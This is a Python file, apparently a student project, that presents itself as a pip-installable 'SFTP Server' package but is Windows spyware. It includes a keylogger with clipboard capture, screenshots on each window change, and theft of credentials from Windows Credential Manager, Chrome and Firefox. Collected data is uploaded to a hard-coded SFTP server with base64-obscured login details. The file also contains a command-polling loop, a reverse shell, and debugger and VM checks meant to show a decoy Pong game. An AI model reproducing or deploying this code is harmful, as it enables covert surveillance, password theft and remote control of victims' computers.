from setuptools import setup

setup(
    name='pythonSftpServer',
    version='1.0.5',
    description='Python SFTP Server connection client and server',
    url='https://github.com/BeastFPV/Hausarbeite_Hacking_with_Python',
    author='BeastFPV',
    author_email='beastfpv12@gmail.com',
    license='BSD 2-clause',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'License :: OSI Approved :: BSD License',
        'Programming Language :: Python :: 3.9',
    ],
)

#The Client should be able to be installed via pip install client and an vulnerability in it
#Afterwards the client should be able to detect if Debuggers are present and if so, it should exit or run diffrent functionalitys
#It should also detect if it is run in a Virtual machine or a Sandbox and if so, it should exit or run diffrent functionalitys
#If nothing of that is detected, it should run the normal functionality, which is Keylogging taking pictures of every new Window and send that
#to the Server (in an adequate format). The Server should also be able to execute commands on the Client and get the output of that command


#Imports
import os
import socket
from ctypes import *
import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
import sqlite3, shutil, win32crypt, sys, random, pygame, time, subprocess, base64
from sys import gettrace as sys_gettrace
from tkinter import *
import pysftp
from _thread import *

#Variables
user32 = windll.user32
kernel32 = windll.kernel32y
psapi = windll.psapi
current_window = None
current_hwnd = 0
screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
screenshot_number = 0
expression = ""
port_reverse_shell = 31337
host_sftp = "192.168.0.104"                         #insert ip of sftp server here (normally no obfuscation required since server should be on a hacked device)
username_sftp = "ZGVza3RvcC03MjJoM2k4XG1hbnVl"      #insert base64 encoded username of sftp server
password_sftp = "VGVubmlzMTIh"                      #insert base64 encoded passowrd of sftp server

#Functions
#------------------------Normal/Fake Function (Game)------------------------
#Python program to create a simple GUI game using Pygame

class guiGame():
    def __init__(self):
        #general setup
        pygame.init()
        self.clock = pygame.time.Clock()

        WIDTH, HEIGHT = 1280, 960
        self.WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
        pygame.display.set_caption("Pong")    #header
        self.FPS = 60


        #game ractangles
        self.BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
        self.PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
        self.OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)

        #background
        self.BG = pygame.Color("grey12")
        self.GREY = (200,200,200)

        self.BALL_VEL_X = 7
        self.BALL_VEL_Y = 7
        self.PLAYER_VEL = 0
        self.OPPONENT_VEL = 7

    def BALL_animation(self):
        global BALL_VEL_X, BALL_VEL_Y
        self.BALL.x += self.BALL_VEL_X
        self.BALL.y += self.BALL_VEL_Y
        #ballbouncing
        if self.BALL.top <= 0 or self.BALL.bottom >= self.HEIGHT:
            self.BALL_VEL_Y *= -1
        
        if self.BALL.left <= 0 or self.BALL.right >= self.WIDTH:
            self.BALL_restart()
            
        if self.BALL.colliderect(self.PLAYER) or self.BALL.colliderect(self.OPPONENT):
            self.BALL_VEL_X *= -1
        
            
    def PLAYER_animation(self):
        self.PLAYER.y += self.PLAYER_VEL
        if self.PLAYER.top <= 0:
            self.PLAYER.top = 0
        if self.PLAYER.bottom >= self.HEIGHT:
            self.PLAYER.bottom = self.HEIGHT

    def OPPONENT_animation(self):
        if self.OPPONENT.top + 20 < self.BALL.y:
            self.OPPONENT.top += self.OPPONENT_VEL
        if self.OPPONENT.bottom - 20 >= self.BALL.y:
            self.OPPONENT.bottom -= self.OPPONENT_VEL
        if self.OPPONENT.top <= 0:
            self.OPPONENT.top = 0
        if self.OPPONENT.bottom >= self.HEIGHT:
            self.OPPONENT.bottom = self.HEIGHT
            
    def BALL_restart(self):
        global BALL_VEL_Y, BALL_VEL_X
        self.BALL.center = (self.WIDTH/2, self.HEIGHT/2)
        self.BALL_VEL_Y *= random.choice((1,-1))
        self.BALL_VEL_X *= random.choice((1,-1))


    #simple pong game if debugger is detected
    def start(self):
        while True:
            #handling input, checks if the close button got clicked!
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()
                
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_DOWN:
                        self.PLAYER_VEL = 7
                    if event.key == pygame.K_UP:
                        self.PLAYER_VEL = -7
                
                if event.type == pygame.KEYUP:
                    if event.key == pygame.K_DOWN:
                        self.PLAYER_VEL = 0
                    if event.key == pygame.K_UP:
                        self.PLAYER_VEL = 0
                        
            self.BALL_animation()
            self.PLAYER_animation()
            self.OPPONENT_animation()
            
            #visuals
            self.WIN.fill(self.BG)
            pygame.draw.rect(self.WIN, self.GREY, self.PLAYER)
            pygame.draw.rect(self.WIN, self.GREY, self.OPPONENT)
            pygame.draw.ellipse(self.WIN, self.GREY, self.BALL)
            pygame.draw.aaline(self.WIN,self.GREY,(self.WIDTH/2,0), (self.WIDTH/2, self.HEIGHT))
            
            #updating the window
            pygame.display.flip()
            self.clock.tick(self.FPS)
#------------------------END Normal/Fake Function (Game)------------------------


#------------------------Keylogger and Screenshotter------------------------
def get_current_process():
    #get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    #find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    #store the current process ID
    process_id = "\%d" % pid.value
    #grab the executable
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process ,None ,byref(executable), 512)
    #now read its title
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    #print out the header if we 're in the right process
    processinfo = "\n[ PID: \%s - \%s - \%s ]" % (process_id , executable.value, window_title.value) +"\n"
    print(processinfo)
    WriteToFile(processinfo)
    #close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    #create and register a hook manager
    kl = pyWinhook.HookManager()
    kl.KeyDown = KeyStroke
    #register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()

def WriteToFile(s):
     #save keystrokes to a file
    if not os.path.exists(str(get_path()) + "keystrokes"):
        os.makedirs(str(get_path()) + "keystrokes")
        open(str(get_path()) + "/keystrokes/keylogger.txt", "w")
    #Modus a + fuers updaten der datei
    file = open(str(get_path()) + '/keystrokes/keylogger.txt', 'a+') 
    if s == "[Space]":
        file.write(" ")
    else:
        file.write(s)
    file.close()

def WritePasswordToFile(s):
    #save keystrokes to a file
    if not os.path.exists(str(get_path()) + "keystrokes"):
        os.makedirs(str(get_path()) + "keystrokes")
        open(str(get_path()) + "/keystrokes/keylogger.txt", "w")
    #Modus a + fuers updaten der datei
    file = open(str(get_path()) + '/keystrokes/keylogger.txt', 'a+') 
    file.write(s)
    file.close()

def KeyStroke(event) :
    global current_window
    #check to see if target changed windows
    if event.WindowName != current_window :
        current_window = event.WindowName
        global screenshot_number
        screenshot_number += 1
        SaveScreenshot("screenshot" + str(screenshot_number) + ".png")
        get_current_process()
    #if they pressed a standard key
    if 32 < event.Ascii < 127:
        c = chr(event.Ascii)
        print(c)
        WriteToFile(c)
    else :
    #if [ Ctrl - V ] , get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            p = "[PASTE] %s[PASTE]" % pasted_value
            print(p)
            WriteToFile(p)
        else :
            k = "[%s]" % event.Key
            print(k)
            WriteToFile(k)
    #pass execution to next hook registered
    return True


def SaveScreenshot(filename):
    #grab a handle to the main desktop window
    hdesktop = win32gui.GetDesktopWindow()
    #determine the size of all monitors in pixels
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    #create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    #create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()
    #create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    #copy the screen into our memory device context
    mem_dc.BitBlt((0 , 0), (width, height), img_dc, (left ,top), win32con.SRCCOPY)
    #save the bitmap to a file
    if not os.path.exists(str(get_path()) + "screenshots"):
        os.makedirs(str(get_path()) + "screenshots")
    screenshot.SaveBitmapFile(mem_dc, str(get_path()) + "/screenshots/" + filename)
    #free our objects
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    global screenshot_number
    screenshot_number += 2
    #number += 1
    #SaveScreenshot("test" + str(number) + ".png", number)
#------------------------END Keylogger and Screenshotter------------------------


#------------------------Communication encryption Function------------------------
def AESencrypt(message, key):
    key = "This is a key123"
    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
    ciphertext = aes.encrypt(message)
    return ciphertext

#Aes decrypt
def AESdecrypt(ciphertext, key):
    if type(ciphertext) == type("hallo"):
        ciphertext = bytes(ciphertext, 'utf-8')[2:-1]
        ciphertext = ciphertext.decode('unicode_escape').encode('raw_unicode_escape')
    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
    plaintext = aes.decrypt(ciphertext)
    return plaintext
#------------------------END Communication encryption Function------------------------

#------------------------Passwordextraction------------------------
#get current user path
def get_path():
    #name = os.getlogin()    #-to get only the username
    path = os.path.join(os.path.expandvars("%userprofile%" + "\\"))
    return path

#get all passwords from the windows credential manager
def get_credman_passwords(quiet=0):
    try:
        credman = win32cred.CredEnumerate(None, 0)
        for i in credman:
            password = win32cred.CredRead(i['TargetName'], i['Type'])
            if password['CredentialBlob']:
                WritePasswordToFile(password)
                password = password.encode('unicode_escape').decode('raw_unicode_escape')
                print(password)
                WritePasswordToFile("Encoded: " + str(password))
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
            elif e[0] == 1312:
                print("Call for CredEnumerate failed: No such login Session! Does not work for Network Logins.")
        return None

#get all passwords from the chrome database
def get_chrome_passwords(quiet=0):
    try:
        chrome_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        shutil.copyfile(chrome_path, chrome_path + ".bak")
        conn = sqlite3.connect(chrome_path + ".bak")
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
            if password[1]:
                WritePasswordToFile("Chrome Password: " + str(password))
    except sqlite3.OperationalError as e:
        if not quiet:
            if e[0] == 'Database is locked':
                print("Chrome is currently running. This function only works if Chrome is closed.")
            else:
                print(e)
        return None
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
        return None
    except: 
        print("Chrome is not installed.")
    finally:
        conn.close()
        os.remove(chrome_path + ".bak")        

#get all passwords from the firefox database
def get_firefox_passwords(quiet=0):
    try:
        firefox_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        for file in os.listdir(firefox_path):
            if file.endswith(".default"):
                conn = sqlite3.connect(os.path.join(firefox_path, file, 'signons.sqlite'))
                cursor = conn.cursor()
                cursor.execute('SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins')
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
                    if password[1]:
                        WritePasswordToFile("Firefox Password: " + str(password))
    except sqlite3.OperationalError as e:
        if not quiet:
            if e[0] == 'Database is locked':
                print("Firefox is currently running. This function only works if Firefox is closed.")
            else:
                print(e)
        return None
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
        return None
    except:
        print("Firefox not installed.")
    finally:
        conn.close()
#------------------------END Passwordextraction------------------------

#------------------------Detect Debuggers------------------------
def is_debugger_present():
    if __debug__ == True or sys.gettrace() != None:
        return True
    else:
        return False

__debug__ #true if started with python -d, else wrong
#------------------------END Detect Debuggers------------------------

#------------------------Start detection of VM------------------------
def is_vm():
    try:
        if os.path.exists("C:\\Windows\\system32\\vmcheck.dll") or hasattr(sys, "getwindowsversion"):
            return True
        else:
            return False
    except:
        return False
#------------------------END detection of VM------------------------

#------------------------Reverse Shell Function------------------------
def reverse_shell(SERVER_HOST, SERVER_PORT):
    #SERVER_HOST = "192.168.0.37"
    #SERVER_PORT = 31337
    BUFFER_SIZE = 1024

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))

    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
        # send the results back to the server
        s.send(output.encode())
    # close client connection
    s.close()



#------------------------END Reverse Shell Function------------------------

#------------------------Connection to FTPS server------------------------
def ftps_connect():
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None
    ftps = pysftp.Connection(host=host_sftp, username=base64.b64decode(username_sftp), password=base64.b64decode(password_sftp), cnopts=cnopts)      #change this to your own ftps server
    return ftps

def ftps_upload_file(ftps, file):
    try:
        ftps.put(file, preserve_mtime=True)
    except:
        print("Error uploading file")

def ftps_download_file(ftps, file):
    try:
        ftps.get(file, open(file, 'wb').write)
    except: 
        print("File not found")

def ftps_create_dir(ftps, dir):
    try:
        ftps.mkdir(str(dir))
        ftps.chdir(str(dir))
    except:
        print("Directory exists already")

def ftps_check_dir(ftps, dir):
    try:
        ftps_create_dir(ftps, dir)
        ftps.chdir(dir)
        return True
    except:
        print("Directory creation failed!")
        return False
#------------------------END Connection to FTPS server------------------------

#Test all of the above functions:
def main():
    #question / startparameter
    #param = input("[+] install suspicious software? (y/n): ")
    #if param == "n":
    #    print("[-] Exiting...")
    #    exit(0)

    count = 0
    #debugger and vm detection, if detected open the game, otherwise the keylogger
    #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
    if 2 == "hello": 
        print("Debugger detected!")
        game = guiGame()
        game.start()
        sys.exit()
    else:
        #multithreading for keylogger and Screenshotsaving
        start_new_thread(get_current_process, ())     #-----------enable this one
        #loop for connection protocol to FTPS server
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            try:
                ftps = ftps_connect() #for ipv4 connection test
                print("Connected to FTPS server! Debugging purpose, delete later!!")
            except:
                time.sleep(20)
            

            #check for commands from ftps server 
            try:
                if count == 0:
                    try:
                        ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
                        count += 1
                        ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
                    except:
                        pass
                
                #now the real part
                ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
                ftps.get('commands.txt', '')
                ftps.remove('commands.txt')
                with open("commands.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
                    command = f.read()
                    print("[+] the command is: " + str(command))
                    if command == "get passwords":
                        get_chrome_passwords()
                        get_firefox_passwords()
                        time.sleep(2)
                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
                        #locally delete the file after upload
                        os.remove(str(get_path()) + "/keystrokes/keylogger.txt")
                    
                    elif command == "get screenshot":
                        if os.path.exists(str(get_path()) + "/screenshots/") :
                            ftps.execute('rm -rf screenshots')
                            print(ftps.listdir())
                            ftps_check_dir(ftps, "screenshots")
                            n = 0
                            print(ftps.listdir())
                            time.sleep(5)
                            while screenshot_number > n:
                                ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n+1) + ".png")
                                n += 2
                            ftps.chdir("..")
                            print("done uploading screenshots")
                    
               
                    elif command == "get keylogger":
                        #upload pictures and keylogger data to ftps server
                        if os.path.exists(str(get_path()) + "/keystrokes/"):
                            ftps.execute('rm -rf keystrokes')
                            ftps_check_dir(ftps, "keystrokes")
                            time.sleep(2)
                            ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
                            ftps.chdir("..")
                            print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
                        
                    #everything after here is jet to come
                    elif command == "get process":
                        ftps_upload_file(ftps, str(get_path()) + "/process/process.txt")
                    elif command == "get systeminfo":
                        ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
                        
                    #also great commands, lets implement them later on (thats why i added them..)
                    elif command == "get webcam":
                        ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
                        ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
                    elif command == "get microphone":
                        ftps_upload_file(ftps, str(get_path()) + "/microphone/microphone.wav")
                        ftps.delete(str(get_path()) + "/microphone/microphone.wav")
                    elif command == "get clipboard":
                        pass
                    else:
                        print("in reverse shell creation")
                        time.sleep(5)
                        command = str(command)
                        time.sleep(5)
                        ip = command.split(' ')
                        ip = ip[1]
                        time.sleep(5)
                        port = 31337
                        reverse_shell(ip, port)

            except:
                os.system('cls' if os.name == 'nt' else 'clear')
                print("No commands found on server!")
            
            #close connection
            ftps.close()
            time.sleep(20)

    #as everything seems to be great here (not quite sure if it works, but it should) lets implement the ssssServer! 
    pass
   #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
   #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)

if __name__ == "__main__":
    main()




#Resources:
"""
SFTP Setup done like shown here: 
https://nagasudhir.blogspot.com/2022/03/setup-sftp-server-and-sftp-client-in.html
"""